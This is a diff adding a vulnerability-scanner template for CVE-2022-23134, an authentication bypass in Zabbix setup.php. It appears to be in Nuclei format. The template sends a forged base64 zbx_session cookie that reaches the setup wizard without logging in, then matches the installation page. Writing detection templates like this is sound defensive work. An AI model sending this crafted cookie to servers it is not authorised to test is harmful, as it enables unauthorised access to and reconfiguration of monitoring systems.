@@ -1,0 +1,30 @@
+id: zabbix-setup-authentication-bypass
+info:
+  name: Zabbix setup.php Authentication Bypass (CVE-2022-23134)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authentication-bypass,CVE-2022-23134
+http:
+  - raw:
+      - |
+        GET /setup.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Installation"
+          - "Zabbix server details"
+          - "Configure DB connection"
+          - "Zabbix"
+        part: body
+      - type: word
+        words:
+          - "youtube_main"
+          - "support.google.com"
+        part: header
+        negative: true
